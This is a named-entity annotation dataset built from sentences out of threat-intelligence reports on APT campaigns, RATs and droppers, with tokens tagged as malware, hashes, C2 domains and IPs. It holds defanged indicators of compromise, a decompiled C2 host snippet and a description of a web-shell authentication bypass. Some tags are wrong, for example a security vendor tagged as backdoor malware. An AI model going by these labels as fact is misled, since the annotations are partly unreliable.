,	O
national	O
shipping	O
company	O
,	O
supporting	O
groups	O
for	O
Korean	O
unification	O
--	O
one	O
might	O
easily	O
suspect	O
that	O
the	O
attackers	O
might	O
be	O
from	O
North	O
Korea	O
.	O

However	O
,	O
the	O
constant	O
addition	O
and	O
changing	O
of	O
features	O
and	O
attack	O
vectors	O
indicate	O
that	O
the	O
attackers	O
behind	O
the	O
campaign	O
are	O
unlikely	O
to	O
stop	O
and	O
are	O
constantly	O
looking	O
to	O
evolve	O
their	O
tools	O
and	O
tactics	O
.	O

With	O
a	O
group	O
like	O
Sofacy	O
,	O
once	O
their	O
attention	O
is	O
detected	O
on	O
a	O
network	O
,	O
it	O
is	O
important	O
to	O
review	O
logins	O
and	O
unusual	O
administrator	O
access	O
on	O
systems	O
,	O
thoroughly	O
scan	O
and	O
sandbox	O
incoming	O
attachments	O
,	O
and	O
maintain	O
two	O
factor	O
authentication	O
for	O
services	O
like	O
email	O
and	O
vpn	O
access	O
.	O

NextSendReceive	O
:	O
5CC33097FB72D001	O
BYTES	O
000064F7­72E4­3F7D­C817­474D­A9BDBDF7	O
STR	O

Again	O
,	O
this	O
behavior	O
and	O
characteristics	O
of	O
the	O
malware	O
is	O
very	O
similar	O
to	O
JSocket	B-malware.backdoor
and	O
AlienSpy	B-malware.backdoor
Android	O
RATs	O
.	O

It	O
re-copies	O
the	O
DLL	O
from	O
the	O
new	O
buffer	O
to	O
the	O
original	O
one	O
using	O
the	O
memcpy	O
function	O
.	O

When	O
an	O
investigator	O
comes	O
across	O
a	O
file	O
megabytes	O
in	O
size	O
,	O
he	O
may	O
be	O
discouraged	O
from	O
taking	O
a	O
closer	O
look	O
.	O

hash	O
and	O
,	O
more	O
importantly	O
,	O
the	O
embedded	O
resource	O
named	O
'	O
'	O
with	O
hash	O
Interestingly	O
,	O
this	O
binary	O
was	O
uploaded	O
on	O
malwr.com	B-url.normal
in	O
early	O
June	O
2016	O
with	O
the	O
file	O
name	O
'	O
Form13.exe	O
'	O
(	O
which	O
might	O
suggest	O
a	O
development	O
version	O
)	O
.	O

525a8e3ae4e3df8c9c61f2a49e38541d196e9228	O
as	O
this	O
is	O
the	O
component	O
that	O
contains	O
logic	O
for	O
interacting	O
with	O
the	O
SWIFT	O
software	O
.	O

Trend	O
Micro	O
About	O
TrendLabs	O
Security	O
Intelligence	O
Blog	O
Home	O
Search	O
:	O
Categories	O
Home	O
'	O
Targeted	O
Attacks	O
'	O
Deciphering	O
Confucius	O
'	O
Cyberespionage	B-malware.backdoor
Operations	O
Deciphering	O
Confucius	O
'	O
Cyberespionage	B-malware.backdoor
Operations	O

The	O
macro	O
in	O
the	O
Word	O
document	O
drops	O
three	O
files	O
in	O
a	O
hard	O
coded	O
path	O
:	O
C	O
:	O
\programdata	O
.	O

Once	O
the	O
URL	O
and	O
command	O
string	O
is	O
extracted	O
,	O
the	O
malware	O
compares	O
the	O
command	O
string	O
with	O
the	O
string	O

[	O
online	O
]	O
.	O

At	O
the	O
time	O
,	O
it	O
is	O
unclear	O
who	O
the	O
targets	O
of	O
the	O
campaign	O
were	O
,	O
who	O
was	O
the	O
perpetrator	O
,	O
or	O
what	O
the	O
exact	O
purpose	O
was	O
.	O

14b9d54f07f3facf1240c5ba89aa2410	B-hash
(	O
googleupdate.exe	O
)	O
2b0bd7e43c1f98f9db804011a54c11d6	B-hash
(	O
malib.dll	O
)	O
feec4b571756e8c015c884cb5441166b	B-hash
(	O
msccvs.dll	O
)	O
84d9d0524e14d9ab5f88bbce6d2d2582	B-hash
(	O
officeupdate.exe	O
)	O

The	O
resource	O
is	O
extracted	O
,	O
decrypted	O
,	O
and	O
stored	O
for	O
future	O
use	O
in	O
the	O
global	O
variable	O
PWD_off_4A4B84	O
by	O
a	O
function	O
we	O
call	O
DecryptResources_sub_49F92C	O
(	O
)	O
:	O

Another	O
related	O
sample	O
(	O
MD5	O
:	O
d7ec457be3fad8057580e07cae74becb	B-hash
)	O
was	O
originally	O
submitted	O
to	O
VirusTotal	O
on	O
Sept	O
.	O

While	O
Peng	O
Yong	O
is	O
clearly	O
tolerant	O
of	O
cyber	O
crime	O
operating	O
through	O
his	O
domain	O
services	O
,	O
this	O
does	O
not	O
indicate	O
he	O
has	O
any	O
direct	O
involvement	O
with	O
Aurora	B-malware.infosteal
.	O

One	O
routine	O
is	O
a	O
function	O
that	O
simply	O
runs	O
a	O
series	O
of	O
loops	O
,	O
incrementing	O
a	O
local	O
variable	O
over	O
and	O
over	O
,	O
thousands	O
of	O
times	O
.	O

The	O
njRAT	B-malware.backdoor
used	O
in	O
this	O
cyber	O
attack	O
was	O
built	O
from	O
this	O
builder	O
kit	O
.	O

While	O
these	O
attempts	O
appear	O
to	O
have	O
failed	O
due	O
one	O
of	O
the	O
attack	O
scripts	O
'	O
conditional	O
checks	O
,	O
the	O
attacker	O
persisted	O
with	O
their	O
efforts	O
.	O

It	O
is	O
important	O
to	O
note	O
that	O
reverse	O
engineering	O
and	O
analysis	O
of	O
the	O
malware	O
system	O
is	O
still	O
underway	O
.	O

In	O
one	O
example	O
,	O
Unit	O
42	O
observed	O
the	O
following	O
data	O
within	O
an	O
analysis	O
environment	O
,	O
which	O
was	O
then	O
encrypted	O
using	O
a	O
single-byte	O
XOR	O
algorithm	O
and	O
a	O
key	O
of	O
0x45	O
before	O
being	O
sent	O
to	O
the	O
C2	O
server	O
:	O

Here	O
's	O
where	O
our	O
breakpoint	O
is	O
hit	O
at	O
this	O
address	O
.	O

date	O
May	O
14	O
th	O
2012	O
date	O
May	O
26	O
th	O
2012	O
date	O
Jun	O
24	O
th	O
2012	O
date	O
Jun	O
29	O
th	O
2012	O
date	O
Jul	O
29	O
th	O
2012	O
date	O
Aug	O
1	O
st	O
2012	O
date	O
Aug	O
5	O
th	O
2012	O
date	O
Oct	O
16	O
th	O
2012	O
date	O
Oct	O
24	O
th	O
2012	O
date	O
Oct	O
31	O
st	O
2012	O

Indicators	O
of	O
Compromise	O
:	O

'	O
Fancy	O
Bears	O
'	O
Hack	O
Team	O
'	O
,	O
a	O
previously	O
unknown	O
group	O
purporting	O
to	O
be	O
affiliated	O
with	O
Anonymous	O
,	O
claims	O
via	O
Twitter	O
to	O
have	O
compromised	O
WADA	O
,	O
and	O
directs	O
readers	O
to	O
a	O
website	O
hosting	O
stolen	O
documents	O
.	O

Taken	O
alongside	O
the	O
explicit	O
use	O
of	O
the	O
name	O
'	O
FinSpy	B-malware.infosteal
'	O
in	O
debug	O
strings	O
found	O
in	O
infected	O
processes	O
,	O
we	O
suspect	O
that	O
the	O
malware	O
is	O
the	O
FinSpy	B-malware.infosteal
remote	I-malware.infosteal
intrusion	I-malware.infosteal
tool	O
.	O

ONCLUSION	O

Many	O
A/V	O
products	O
now	O
contain	O
signatures	O
for	O
the	O
Aurora	B-malware.infosteal
exploit	O
and	O
will	O
be	O
effective	O
in	O
detection	O
and	O
removal	O
.	O

At	O
the	O
time	O
of	O
writing	O
two	O
Babar64	B-malware.drop
droppers	O
are	O
known	O
,	O
dropping	O
one	O
implant	O
each	O
.	O

These	O
accounts	O
were	O
@	O
US2515	O
and	O
@	O
monkey_drive	O
.	O

When	O
reviewing	O
network	O
perimeter	O
logs	O
for	O
the	O
IP	O
addresses	O
,	O
organizations	O
may	O
find	O
numerous	O
instances	O
of	O
these	O
IPs	O
attempting	O
to	O
connect	O
to	O
their	O
systems	O
.	O

Presumably	O
a	O
failsafe	O
if	O
the	O
driver	O
is	O
unable	O
to	O
load	O
,	O
the	O
secondary	O
method	O
requires	O
the	O
client	O
to	O
send	O
a	O
POST	O
request	O
with	O
the	O
following	O
form	O
:	O

Fig	O
10	O
.	O

This	O
form	O
of	O
subterfuge	O
has	O
been	O
previously	O
employed	O
by	O
other	O
Middle	O
Eastern	O
threat	O
actors	O
such	O
as	O
'	O
Desert	B-malware.unknown
Falcons	I-malware.unknown
'	O
,	O
reported	O
by	O
Kaspersky	O
and	O
by	O
elements	O
operating	O
in	O
Syria	O
.	O

ZxShell	B-malware.backdoor
is	O
a	O
sophisticated	O
tool	O
employed	O
by	O
Group	O
72	O
that	O
contains	O
all	O
kinds	O
of	O
functionality	O
.	O

The	O
C	O
&	O
C	O
servers	O
revealed	O
after	O
decryption	O
are	O
:	O
rat.pzchao.com	B-url.cncsvr
–	O
used	O
for	O
sending	O
instructions	O
centuriosa.info	B-url.cncsvr
–	O
used	O
for	O
sending	O
instructions	O
zl855.no-ip.info	B-url.cncsvr
–	O
used	O
for	O
requesting	O
new	O
confi	O
guration	O
fi	O
le	O
of	O
the	O
C2	O
servers	O
It	O
will	O
then	O
set	O
a	O
Windows	O
station	O
,	O
fi	O
rst	O
by	O
saving	O
the	O
current	O
station	O
by	O
calling	O
GetProcessWindowStation	O
(	O
)	O
then	O
creating	O
a	O
new	O
one	O
named	O
winsta0	O
by	O
calling	O
OpenWindowStation	O
(	O
)	O
.	O

Once	O
the	O
VBRs	O
were	O
added	O
correctly	O
we	O
proceeded	O
to	O
add	O
the	O
partitions	O
into	O
EnCase	O
.	O

Therefore	O
the	O
persistent	O
adversary	O
will	O
need	O
to	O
consider	O
multiple	O
vectors	O
to	O
infiltrate	O
target	O
systems	O
.	O

XtremeRAT	B-malware.backdoor
allows	O
an	O
attacker	O
to	O
:	O
Interact	O
with	O
the	O
victim	O
via	O
a	O
remote	O
shell	O
Upload/download	O
files	O
Interact	O
with	O
the	O
registry	O
Manipulate	O
running	O
processes	O
and	O
services	O
Capture	O
images	O
of	O
the	O
desktop	O
Record	O
from	O
connected	O
devices	O
,	O
such	O
as	O
a	O
webcam	O
or	O
microphone	O
Moreover	O
,	O
during	O
the	O
build	O
process	O
,	O
the	O
attacker	O
can	O
specify	O
whether	O
to	O
include	O
keylogging	O
and	O
USB	O
infection	O
functions	O
.	O

There	O
are	O
other	O
components	O
and	O
artifacts	O
of	O
this	O
malware	O
that	O
are	O
currently	O
inaccessible	O
to	O
Fidelis	O
analysts	O
.	O

The	O
executable	O
file	O
'	O
Quetta_Killings_Footage.exe	B-malware.unknown
'	O
(	O
md5	O
387947d5891aeb2c32f231e9abadfcec	B-hash
)	O
connects	O
to	O
the	O
known	O
malicious	O
domain	O
communication-principals[.]com	B-url.unknown
.	O

Detatch	O
Checkbox	O
Specifies	O
whether	O
commands	O
run	O
from	O
the	O
Exec	O
button	O
will	O
have	O
their	O
output	O
redirected	O
and	O
displayed	O
to	O
the	O
adversary	O
when	O
the	O
command	O
is	O
finished	O
executing	O
.	O

Accordingly	O
,	O
the	O
country	O
with	O
the	O
overwhelming	O
number	O
of	O
detections	O
was	O
in	O
Italy	O
followed	O
by	O
Belgium	O
and	O
Algeria	O
.	O

Compiled	O
Time	O
Stamp	O
:	O
2018-01-08	O
02:15:02	O
(	O
Jan	O
.	O

signed	O
int	O
__thiscall	O
>	O
hInternetOpen	O
)	O
|	O
|	O
url	O
(	O
url	O
lstrcpyA	O
(	O
&	O
host	O
,	O
'	O
news.grouptumbler.com	O
'	O
)	O
;	O
wnsprintfA	O
(	O
&	O
host	O
,	O
256	O
,	O
'	O
%	O
x	O
%	O
s	O
'	O
,	O
*	O
&	O
>	O
path	O
,	O
0x409001	O
)	O
;	O
!	O
=	O
'	O
.	O
'	O

Bandook	B-malware.unknown
has	O
been	O
available	O
since	O
roughly	O
2007	O
.	O

Private	O
and	O
public	O
sector	O
organizations	O
need	O
to	O
continuously	O
monitor	O
their	O
IT	O
and	O
OT	O
networks	O
for	O
anomalous	O
activities	O
indicating	O
they	O
've	O
been	O
compromised	O
.	O

The	O
attacker	O
is	O
most	O
likely	O
using	O
this	O
information	O
as	O
part	O
of	O
an	O
anti-vm	O
attempt	O
within	O
this	O
malware	O
.	O

File	O
Entrenchment	O
Paths	O
:	O

Issuer	O
:	O
VeriSign	O
Class	O
3	O
Code	O
Signing	O
2010	O
CA	O

All	O
of	O
the	O
following	O
information	O
and	O
threat	O
indicators	O
are	O
available	O
within	O
ThreatConnect.com	B-url.normal
and	O
have	O
been	O
shared	O
with	O
the	O
ThreatConnect	O
community	O
.	O

The	O
attacker	O
is	O
still	O
unknown	O
to	O
us	O
.	O

It	O
is	O
also	O
stored	O
as	O
encrypted	O
string	O
in	O
the	O
binary	O
,	O
and	O
has	O
been	O
seen	O
to	O
decrypt	O
to	O
either	O
'	O
perf585.dll	O
'	O
or	O
'	O
dump21cb.dll	O
'	O
depending	O
on	O
the	O
dropper	O
.	O

Babar	B-malware.drop
also	O
implements	O
an	O
obfuscation	O
technique	O
to	O
hide	O
certain	O
API	O
names	O
.	O

공격	O
도구	O
(	O
Tools	O
)	O
......................................................................................................................................................	O
18	O
다수	O
공격	O
사례의	O
연관성	O
..............................................................................................................................................	O
19	O
안랩	O
제품의	O
대응	O
현황	O
...................................................................................................................................................	O
21	O
결론	O
..........................................................................................................................................................................................	O
22	O
참고자료	O
.................................................................................................................................................................................	O
23	O

In	O
order	O
to	O
bypass	O
authentication	O
,	O
a	O
user	O
session	O
must	O
satisfy	O
one	O
of	O
three	O
options	O
:	O
Pass	O
a	O
cookie	O
with	O
the	O
name	O
<	O
Redacted	O
>	O
Set	O
the	O
Keep-Alive	O
HTTP	O
header	O
to	O
320	O
Set	O
language	O
HTTP	O
header	O
to	O
contain	O
es-DN	O
Since	O
web	O
shells	B-malware.backdoor
are	O
text-based	O
,	O
we	O
can	O
easily	O
see	O
how	O
this	O
authentication	O
takes	O
place	O
:	O

File	O
Name	O
:	O
Payment	O
Invoice.jar	O
File	O
Size	O
:	O
44237	O
bytes	O
MD5	O
:	O
44f011702ff80b337124d4879607f6b1	O
SHA1	O
:	O
b2474bffcbeaabdd111f3909075fc7f556901c62	O

The	O
experts	O
of	O
the	O
G	O
DATA	O
SecurityLabs	O
had	O
access	O
to	O
the	O
panel	O
used	O
by	O
'	O
Kraken	B-malware.ransom
HTTP	I-malware.ransom
'	O
but	O
the	O
source	O
code	O
is	O
protected	O
by	O
a	O
commercial	O
packer	O
called	O
IonCube	O
loader	O
.	O

يمويلا	O
تارباخملا	O
ريرقت	O
صخلم	O

Message	O
body	O
'	O
Compliance	O
Verification	O
'	O
<	O
abdul.razzak@uaeexchange[.]com	O
>	O
ComFirm	O
transactions	O
before	O
release	O
Sun	O
,	O
18	O
May	O
2014	O
16:31:12	O
-0700	O
Hold-transactions-pdf.jar	B-malware.infosteal
,	O
and	O
verification-docx.jar	B-malware.infosteal

Both	O
Cloud	O
Atlas	O
and	O
RedOctober	B-malware.unknown
malware	O
implants	O
rely	O
on	O
a	O
similar	O
construct	O
,	O
with	O
a	O
loader	O
and	O
the	O
final	O
payload	O
that	O
is	O
stored	O
encrypted	O
and	O
compressed	O
in	O
an	O
external	O
file	O
.	O

*	O
•	O
backup*	O
.	O

The	O
Royal	O
Hashemite	O
Court	O
in	O
Jordan	O
(	O
rhc.jo	O
)	O
.	O

Accenture	O
,	O
the	O
Accenture	O
logo	O
,	O
iDefense	O
and	O
other	O
trademarks	O
,	O
service	O
marks	O
,	O
and	O
designs	O
are	O
registered	O
or	O
unregistered	O
trademarks	O
of	O
Accenture	O
and	O
its	O
subsidiaries	O
in	O
the	O
United	O
States	O
and	O
in	O
foreign	O
countries	O
.	O

Shamoon	B-malware.unknown
the	O
Wiper	O
Copycats	O
at	O
Work	O
(	O
2012	O
)	O
,	O
retrieved	O
26	O
Oct	O
2012	O
from	O
http://www.securelist.com/en/blog/208193786/Shamoon_the_Wiper_Copycats_at_Work	B-url.normal
Shamoon	B-malware.unknown
the	O
Wiper	O
in	O
details	O
,	O
Tarakanov	O
,	O
Dmitry	O
(	O
2012	O
)	O
,	O
retrieved	O
26	O
Oct	O
2012	O
from	O
http://www.securelist.com/en/blog/208193795/Shamoon_the_Wiper_in_details	B-url.normal
Shamoon	B-malware.unknown
the	O
Wiper	O
in	O
details	O
II	O
,	O
Tarakanov	O
,	O
Dmitry	O
(	O
2012	O
)	O
,	O
retrieved	O
26	O
Oct	O
2012	O
from	O
http://www.securelist.com/en/blog/208193834/Shamoon_The_Wiper_further_details_Part_II	B-url.normal
Shamoon	B-malware.unknown
,	O
a	O
two-staged	O
targeted	O
attack	O
(	O
2012	O
)	O
,	O
retrieved	O
26	O
Oct	O
2012	O
from	O
http://blog.seculert.com/2012/08/shamoon-two-stage-targeted-attack.html	B-url.normal
'	O
Shamoon	B-malware.unknown
'	O
Virus	O
Most	O
Destructive	O
Ever	O
To	O
Hit	O
A	O
Business	O
,	O
Leon	O
Panetta	O
Warns	O
(	O
2012	O
)	O
,	O
retrieved	O
from	O
http://www.huffingtonpost.com/2012/10/11/shamoon-virus-leon-panetta_n_1960113.html	B-url.normal
Carrier	O
,	O
Brian	O
(	O
2005	O
)	O
.	O

This	O
information	O
can	O
then	O
be	O
used	O
by	O
an	O
organization	O
to	O
create	O
appropriate	O
and	O
proportional	O
responses	O
to	O
properly	O
protect	O
an	O
organization	O
's	O
network	O
.	O

He	O
is	O
known	O
to	O
have	O
been	O
critical	O
of	O
Arafat	O
and	O
later	O
Abbas	O
.	O

f8daa49c489f606c87d39a88ab76a1ba	B-hash
15588a9ba1c0abefd38ac2594ee5be53	B-hash
04b4b036a48dc2d2022cc7704f85a560	B-hash
becc8e77ef003a4c88f7e6348ffd3609	B-hash
ceeeacbaf38792bcf06022e2b4874782	B-hash
515dce0ede42052ff3ef664db9873cea	B-hash
50c1d394bfa187ffd6251df6dd14e939	B-hash
3bd16cc1d1fea7190c36b3bd10c6810d	B-hash
b6c861556412a15b7979459176b7d82f	B-hash
qhavcloud[.]com	B-url.cncsvr
173[.]212[.]194[.]214	B-ip.unknown
173[.]212[.]193[.]53	B-ip.unknown
91[.]205[.]173[.]3	B-ip.unknown
180[.]92[.]154[.]176	B-ip.unknown
idsadesk[.]in	B-url.unknown
idsagroup[.]in	B-url.unknown
iasia69@z7az14m[.]com	B-url.unknown
hxxp://qhavcloud[.]com//northernlights//PingPong.php	B-url.cncsvr
hxxp://qhavcloud[.]com//northernlights//postdata.php	B-url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobProcesses.php	B-url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobWork1.php	B-url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobWork2.php	B-url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobTCP1.php	B-url.cncsvr
hxxp://qhavcloud[.]com//northernlights//JobTCP2.php	B-url.cncsvr
hxxp://qhavcloud[.]com//northernlights//updateproductdownload.php	B-url.cncsvr
hxxp://qhavcloud[.]com//northernlights//Uninstaller.php	B-url.cncsvr

This	O
turned	O
out	O
to	O
be	O
another	O
driver	O
,	O
with	O
functionality	O
very	O
nearly	O
identical	O
to	O
that	O
of	O
mrxcls.sys	O
apart	O
from	O
the	O
following	O
exceptions	O
:	O
1	O
.	O

The	O
downloader	O
then	O
downloads	O
Asruex	B-malware.drop
from	O
another	O
C	O
&	O
C	O
server	O
,	O
which	O
is	O
then	O
executed	O
.	O

Next	O
,	O
the	O
server	O
variant	O
will	O
append	O
a	O
hyphen	O
and	O
a	O
four	O
digit	O
value	O
to	O
the	O
end	O
of	O
the	O
infection	O
ID	O
to	O
generate	O
the	O
unique	O
infection	O
ID	O
for	O
the	O
victim	O
's	O
machine	O
.	O

rastls.dll	O
(	O
SHA1	O
:	O
82e579bd49d69845133c9aa8585f8bd26736437b	B-hash
,	O
malicious	O
DLL	O
sideloaded	O
by	O
rastlsc.exe	O
)	O
The	O
path	O
changes	O
from	O
sample	O
to	O
sample	O
but	O
the	O
pattern	O
is	O
similar	O
.	O

OMPARISON	O
ANALYSIS	O
ON	O
MODULE	O
DATA	O
PACKAGE	O
.....................................................................................	O
10	O

Sofacy	O
set	O
up	O
and	O
maintained	O
multiple	O
servers	O
and	O
c2	O
for	O
varying	O
durations	O
,	O
registering	O
fairly	O
recognizable	O
domains	O
with	O
privacy	O
services	O
,	O
registrars	O
that	O
accept	O
bitcoin	O
,	O
fake	O
phone	O
numbers	O
,	O
phony	O
individual	O
names	O
,	O
and	O
1	O
to	O
1	O
email	O
address	O
to	O
domain	O
registration	O
relationships	O
.	O

Based	O
on	O
samples	O
obtained	O
from	O
our	O
own	O
collections	O
and	O
generously	O
shared	O
to	O
us	O
by	O
a	O
trusted	O
source	O
,	O
we	O
have	O
been	O
able	O
to	O
identify	O
some	O
of	O
the	O
tasks	O
executed	O
recently	O
by	O
CozyDuke	B-malware.drop
.	O

On	O
the	O
other	O
hand	O
it	O
is	O
practically	O
a	O
load	O
balancing	O
measure	O
.	O

The	O
resource	O
part	O
of	O
the	O
URI	O
is	O
created	O
using	O
the	O
following	O
pseudocode	O
:	O

The	O
sequence	O
is	O
interleaved	O
with	O
junk	O
code	O
,	O
which	O
makes	O
use	O
of	O
the	O
stack	O
pointer	O
,	O
but	O
does	O
not	O
change	O
the	O
conditional	O
flag	O
's	O
value	O
.	O

The	O
commands	O
are	O
denoted	O
by	O
the	O
<	O
|	O
Command	O
|	O
>	O
syntax	O
.	O

Example	O
e-mail	O
:	O
The	O
e-mail	O
contains	O
text	O
,	O
an	O
image	O
(	O
not	O
shown	O
)	O
,	O
and	O
an	O
attachment	O
.	O

This	O
type	O
of	O
strategic	O
analysis	O
can	O
enable	O
the	O
identification	O
of	O
zones	O
in	O
which	O
troops	O
are	O
operating	O
and	O
help	O
prioritize	O
assets	O
within	O
those	O
zones	O
for	O
future	O
targeting	O
.	O

The	O
Ham	B-malware.backdoor
Backdoor	I-malware.backdoor
functions	O
primarily	O
as	O
a	O
modular	O
platform	O
,	O
which	O
provides	O
the	O
attacker	O
with	O
the	O
ability	O
to	O
directly	O
download	O
additional	O
modules	O
and	O
execute	O
them	O
in	O
memory	O
from	O
the	O
command	O
and	O
control	O
(	O
C2	O
)	O
server	O
.	O

ASSOCIATE	O
D	O
IN	O
FOR	O
MATION	O
OPE	O
R	O
ATIONS	O
AC	O
TIVIT	O
Y	O

But	O
on	O
rare	O
occasions	O
,	O
a	O
customer	O
decides	O
to	O
go	O
public	O
with	O
information	O
about	O
their	O
incident	O
and	O
give	O
us	O
permission	O
to	O
share	O
our	O
knowledge	O
of	O
the	O
adversary	O
tradecraft	O
with	O
the	O
broader	O
community	O
and	O
help	O
protect	O
even	O
those	O
who	O
do	O
not	O
happen	O
to	O
be	O
our	O
customers	O
.	O

A	O
Distributed	O
Control	O
System	O
(	O
DCS	O
)	O
provides	O
human	O
operators	O
with	O
the	O
ability	O
to	O
remotely	O
monitor	O
and	O
control	O
an	O
industrial	O
process	O
.	O

תורהנמ	O
הרהנמ	O
ט'לזמ	O
ןיעדומ	O
ןיעידומ	O
דסומ	O
tunnels	O
tunnel	O
drone	O
intelligence	O
intelligence	O
Mossad	O

This	O
recovery	O
can	O
be	O
successful	O
without	O
the	O
use	O
of	O
the	O
EnCase	O
suite	O
of	O
forensic	O
software	O
as	O
well	O
.	O

These	O
tasks	O
can	O
be	O
divided	O
into	O
two	O
categories	O
.	O

The	O
creators	O
of	O
Green	O
Simurgh	O
responded	O
by	O
posting	O
a	O
prominent	O
warning	O
on	O
their	O
website	O
highlighting	O
the	O
presence	O
of	O
these	O
malicious	O
installers	O
.	O

Volexity	B-malware.backdoor
has	O
not	O
had	O
enough	O
time	O
to	O
thoroughly	O
analyze	O
the	O
file	O
to	O
see	O
if	O
it	O
is	O
an	O
actual	O
exploit	O
or	O
if	O
the	O
attackers	O
rely	O
on	O
user	O
assisted	O
malware	O
installation	O
.	O

Review	O
web	O
proxy	O
logs	O
for	O
connections	O
to	O
the	O
included	O
network	O
based	O
indicators	O
of	O
compromise	O
.	O

As	O
with	O
other	O
common	O
threat	O
actors	O
,	O
the	O
group	O
relies	O
on	O
social	O
engineering	O
methods	O
to	O
deceive	O
its	O
targets	O
prior	O
to	O
infection	O
.	O

These	O
attachments	O
may	O
often	O
have	O
consisted	O
of	O
the	O
described	O
malicious	O
files	O
inside	O
archives	O
like	O
RAR	O
or	O
ZIP	O
.	O

T	O
HREAT	O
S	O
CAT	O
EGORIES	O
T	O
AGS	O
ENCYCLOPEDIA	O
ST	O
AT	O
IST	O
ICS	O
DESCRIPT	O
IONS	O

In	O
a	O
story	O
which	O
reminds	O
us	O
of	O
the	O
Bangladesh	O
Bank	O
case	O
–	O
the	O
culprits	O
had	O
compromised	O
the	O
bank	O
's	O
system	O
connected	O
to	O
the	O
SWIFT	O
network	O
and	O
used	O
this	O
to	O
perform	O
the	O
transfers	O
.	O

According	O
to	O
a	O
blog	O
article	O
by	O
Microsoft	O
,	O
the	O
malware	O
is	O
associated	O
with	O
an	O
attacker	O
group	O
identified	O
as	O
'	O
DarkHotel	O
'	O
(	O
Microsoft	O
calls	O
it	O
as	O
'	O
Dubnium	O
'	O
)	O
.	O

'	O
The	O
Taidoor	B-malware.drop
Campaign	I-malware.drop
:	O
An	O
In-Depth	O
Analysis	O
.	O
'	O

Responding	O
to	O
Unauthorized	O
Access	O
to	O
Networks	O

Read	O
our	O
security	O
predictions	O
for	O
2018	O
.	O

The	O
use	O
of	O
public	O
cloud	O
infrastructure	O
to	O
help	O
deliver	O
the	O
different	O
stages	O
plays	O
a	O
particularly	O
big	O
role	O
in	O
delivering	O
the	O
malicious	O
payload	O
.	O

Press	O
become	O
aware	O
of	O
the	O
incident	O
.	O

The	O
payload	O
emits	O
the	O
'	O
POST	O
'	O
network	O
beacon	O
shown	O
below	O
along	O
with	O
stub	O
data	O
.	O

When	O
executed	O
,	O
this	O
binary	O
decrypts	O
its	O
resource	O
(	O
XOR	O
with	O
a	O
128-byte	O
,	O
hardcoded	O
key	O
)	O
and	O
decompresses	O
the	O
decrypted	O
data	O
(	O
LZMA	O
)	O
.	O

Get	O
TCP	O
&	O
UDP	O
network	O
connections	O
Get	O
process	O
listing	O
Terminate	O
process	O
Get	O
CPU	O
info	O
,	O
Windows	O
and	O
System32	O
folder	O
,	O
hostname	O
,	O
user	O
name	O
,	O
clipboard	O
contents	O
Delete	O
its	O
files	O
and	O
registries	O
from	O
the	O
system	O
(	O
uninstall	O
itself	O
)	O
xE2-	O
xE3	O
Related	O
to	O
stealing	O
desktop	O
screenshots	O
Get	O
desktop	O
screenshot	O
Get	O
file	O
listing	O
Connect	O
to	O
other	O
network	O
Set	O
mouse	O
event	O
Start	O
capture	O
window	O
for	O
media	O
grabbing	O
Media	O
capture	O
related	O
Start	O
audio	O
recording	O
Search	O
for	O
certain	O
files	O
and	O
steal	O
file	O
content	O

At	O
this	O
point	O
DerusbiThread	O
:	O
:DerusbiThread	O
enters	O
an	O
infinite	O
loop	O
of	O
waiting	O
for	O
new	O
connections	O
to	O
the	O
listening	O
socket	O
and	O
dispatching	O
a	O
new	O
thread	O
(	O
dubbed	O
)	O
to	O
handle	O
the	O
traffic	O
for	O
the	O
socket	O
until	O
fShutdown	O
is	O
set	O
.	O

The	O
domains	O
researchwork.org	B-url.unknown
and	O
dropboxonline.com	B-url.unknown
were	O
both	O
on	O
64.202.189.170	B-ip.unknown
on	O
2011-01-14	O
.	O

Rotter2.sytes.net	B-url.cncsvr
rotter.net	O
Israeli	O
news	O
outlet	O
haartezenglish.strangled.net	B-url.cncsvr
haaretz.co.il	O
Israeli	O
news	O
outlet	O
wallanews.sytes.net	B-url.cncsvr
ynet.sytes.net	B-url.cncsvr
safar.selfip.com	B-url.cncsvr
depka.sytes.net	B-url.cncsvr
walla.co.il	O
ynet.co.il	O
Safar	O
Israeli	O
news	O
outlet	O
Israeli	O
news	O
outlet	O
Islamic	O
2	O
month	O
debka.com	O
Israeli	O
news	O
outlet	O
As	O
shown	O
,	O
there	O
appears	O
to	O
be	O
a	O
theme	O
here	O
,	O
with	O
a	O
number	O
of	O
Israeli	O
news	O
organisations	O
being	O
used	O
as	O
C	O
&	O
C	O
themes	O
and	O
hence	O
probably	O
being	O
targeted	O
.	O

LIKELY	O
RUSSIA-BASED	O
RECONNAISSANCE	O
OF	O
UKRAINIAN	O
GOVERNMENT	O
AND/OR	O
MILITARY	O
TARGETS	O

Live-fire	O
Security	O
Testing	O
with	O
Armitage	O
and	O
Metasploit	O
Get	O
in	O
through	O
the	O
backdoor	O
:	O
Post	O
exploitation	O
with	O
Armitage	O
Tutorial	O
:	O
Hacking	O
Linux	O
with	O
Armitage	O
The	O
Design	O
of	O
a	O
Proofreading	O
Software	O
Service	O
Agent-based	O
Traffic	O
Generation	O

Administrator	O

39	O
20	O
.	O

The	O
browsing	O
activity	O
was	O
centered	O
on	O
its	O
GT-SUITE	O
software	O
.	O

1	O
)	O
.	O

Search	O
:	O

<	O
first	O
3	O
characters	O
of	O
last	O
string	O
>	O
_id=	O
<	O
43	O
character	O
string	O
>	O
=	O
HTTP/1.1	O
Accept	O
:	O
image/jpeg	O
,	O
application/x-ms-application	O
,	O
image/gif	O
,	O
application/xaml+xml	O
,	O
image/pjpeg	O
,	O
application/x-ms-xbap	O
,	O
*/*	O
User-Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
8.0	O
;	O
Windows	O
NT	O
6.1	O
;	O
Trident/4.0	O
;	O
SLCC2	O
;	O
.NET	O
CLR	O
2.0.50727	O
;	O
.NET	O
CLR	O
3.5.30729	O
;	O
.NET	O
CLR	O
3.0.30729	O
;	O
.NET4.0C	O
;	O
.NET4.0E	O
)	O
Host	O
:	O
<	O
C2	O
Location	O
>	O
Cache-Control	O
:	O
no-cache	O

The	O
first	O
section	O
of	O
the	O
PowerShell	O
script	O
is	O
responsible	O
for	O
setting	O
different	O
key	O
variables	O
that	O
are	O
used	O
by	O
the	O
remaining	O
sections	O
of	O
the	O
PowerShell	O
script	O
,	O
especially	O
the	O
following	O
variables	O
:	O
TEMpPAtH	O
=	O
'	O
C	O
:	O
\ProgramData\	O
'	O
(	O
the	O
path	O
